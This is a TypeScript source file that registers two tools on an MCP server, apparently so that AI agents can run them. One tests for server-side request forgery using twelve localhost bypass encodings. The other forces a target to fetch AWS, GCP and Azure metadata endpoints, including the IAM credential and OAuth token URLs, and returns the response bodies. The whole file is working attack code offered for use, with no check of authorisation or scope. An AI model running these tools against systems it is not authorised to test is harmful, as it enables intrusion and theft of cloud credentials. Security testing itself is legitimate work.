/**
 * SSRF testing tools.
 *
 * Tests server-side request forgery with localhost bypass variants and cloud metadata access.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "ssrf_test",
    "Test SSRF with localhost bypass variants. Sends 10+ representations of localhost (127.0.0.1, 0, decimal, hex, IPv6, etc.) to check if the server fetches internal resources. Returns results array with variant, payload_url, status, length, different_from_baseline per attempt. Side effects: May cause the target server to make internal requests.",
    {
      url: z.string().describe("Target URL that accepts a URL/host parameter"),
      parameter: z.string().describe("Parameter that accepts URLs, e.g. 'url', 'src', 'redirect'"),
      internal_target: z.string().optional().describe("Internal resource to reach, e.g. 'http://localhost/admin'"),
      method: z.enum(["GET", "POST"]).optional().describe("HTTP method"),
    },
    async ({ url, parameter, internal_target = "http://localhost/admin", method = "POST" }) => {
      requireTool("curl");

      // Parse the internal target to replace the host portion
      const parsedUrl = new URL(internal_target);
      const path = parsedUrl.pathname || "/";

      const localhostVariants: Array<[string, string]> = [
        ["127.0.0.1", `http://127.0.0.1${path}`],
        ["localhost", `http://localhost${path}`],
        ["0", `http://0${path}`],
        ["0.0.0.0", `http://0.0.0.0${path}`],
        ["127.1", `http://127.1${path}`],
        ["decimal_2130706433", `http://2130706433${path}`],
        ["hex_0x7f000001", `http://0x7f000001${path}`],
        ["octal_017700000001", `http://017700000001${path}`],
        ["ipv6_::1", `http://[::1]${path}`],
        ["ipv6_0000::1", `http://[0000:0000:0000:0000:0000:0000:0000:0001]${path}`],
        ["nip.io", `http://127.0.0.1.nip.io${path}`],
        ["redirect_scheme", `http://localhost%23@example.com${path}`],
      ];

      // First get an error baseline with an obviously-invalid target
      const baselineCurlArgs =
        method === "POST"
          ? [
              "-sk", "-o", "/dev/null", "-w", "%{http_code}:%{size_download}",
              "-X", method, "-d", `${parameter}=http://invalid.example.test/nothing`,
              url,
            ]
          : [
              "-sk", "-o", "/dev/null", "-w", "%{http_code}:%{size_download}",
              `${url}?${parameter}=http://invalid.example.test/nothing`,
            ];

      const baseline = await runCmd("curl", baselineCurlArgs);
      const bp = baseline.stdout.split(":");
      const baselineStatus = bp.length > 0 ? parseInt(bp[0], 10) : 0;
      const baselineLength = bp.length > 1 ? parseInt(bp[1], 10) : 0;

      const results = [];
      for (const [variantName, payloadUrl] of localhostVariants) {
        let curlArgs: string[];
        if (method === "POST") {
          curlArgs = [
            "-sk", "-o", "/dev/null",
            "-w", "%{http_code}:%{size_download}",
            "-X", "POST",
            "-d", `${parameter}=${payloadUrl}`,
            url,
          ];
        } else {
          curlArgs = [
            "-sk", "-o", "/dev/null",
            "-w", "%{http_code}:%{size_download}",
            `${url}?${parameter}=${payloadUrl}`,
          ];
        }

        const res = await runCmd("curl", curlArgs);
        const parts = res.stdout.split(":");
        const status = parts.length > 0 ? parseInt(parts[0], 10) : 0;
        const length = parts.length > 1 ? parseInt(parts[1], 10) : 0;

        const different =
          status !== baselineStatus || Math.abs(length - baselineLength) > 50;
        results.push({
          variant: variantName,
          payload_url: payloadUrl,
          status,
          length,
          different_from_baseline: different,
        });
      }

      const promising = results.filter((r) => r.different_from_baseline);
      const result = {
        baseline_status: baselineStatus,
        baseline_length: baselineLength,
        results,
        promising_variants: promising.map((r) => r.variant),
        hint:
          promising.length > 0
            ? "Variants with different status/length from baseline may indicate successful SSRF."
            : "No variants differed from baseline. Try different parameters or internal targets.",
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "ssrf_cloud_metadata",
    "Test SSRF access to cloud metadata endpoints (AWS/GCP/Azure). Attempts to reach instance metadata services through the SSRF vector. Returns results array with provider, endpoint, status, length, response_snippet. Side effects: May cause target to request cloud metadata. Could expose IAM credentials if successful.",
    {
      url: z.string().describe("Target URL with SSRF-vulnerable parameter"),
      parameter: z.string().describe("Parameter that accepts URLs"),
      cloud_provider: z
        .enum(["aws", "gcp", "azure", "all"])
        .optional()
        .describe("Cloud provider to test metadata endpoints for"),
      method: z.enum(["GET", "POST"]).optional().describe("HTTP method"),
    },
    async ({ url, parameter, cloud_provider = "all", method = "POST" }) => {
      requireTool("curl");

      const endpoints: Record<string, Array<[string, string]>> = {
        aws: [
          ["instance_id", "http://169.254.169.254/latest/meta-data/instance-id"],
          ["iam_role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
          ["user_data", "http://169.254.169.254/latest/user-data"],
          ["hostname", "http://169.254.169.254/latest/meta-data/hostname"],
          ["token_v2", "http://169.254.169.254/latest/api/token"],
        ],
        gcp: [
          ["project_id", "http://metadata.google.internal/computeMetadata/v1/project/project-id"],
          ["service_accounts", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"],
          ["hostname", "http://metadata.google.internal/computeMetadata/v1/instance/hostname"],
        ],
        azure: [
          ["instance", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
          ["identity", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"],
        ],
      };

      const providersToTest =
        cloud_provider === "all" ? Object.keys(endpoints) : [cloud_provider];

      const results = [];
      for (const provider of providersToTest) {
        for (const [epName, epUrl] of endpoints[provider] ?? []) {
          let curlArgs: string[];
          if (method === "POST") {
            curlArgs = [
              "-sk",
              "-o", "-",
              "-w", "\n__META__%{http_code}:%{size_download}",
              "-X", "POST",
              "-d", `${parameter}=${epUrl}`,
              url,
            ];
          } else {
            curlArgs = [
              "-sk",
              "-o", "-",
              "-w", "\n__META__%{http_code}:%{size_download}",
              `${url}?${parameter}=${epUrl}`,
            ];
          }

          const res = await runCmd("curl", curlArgs);
          let body = res.stdout;
          const metaMarker = body.lastIndexOf("__META__");
          let status = 0;
          let length = 0;
          if (metaMarker !== -1) {
            const meta = body.slice(metaMarker + 8).trim();
            const parts = meta.split(":");
            status = parts.length > 0 ? parseInt(parts[0], 10) : 0;
            length = parts.length > 1 ? parseInt(parts[1], 10) : 0;
            body = body.slice(0, metaMarker);
          }

          results.push({
            provider,
            endpoint_name: epName,
            metadata_url: epUrl,
            status,
            length,
            response_snippet: body.slice(0, 500),
          });
        }
      }

      const result = {
        cloud_provider,
        results,
        hint: "Non-error responses with meaningful content indicate cloud metadata exposure.",
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );
}
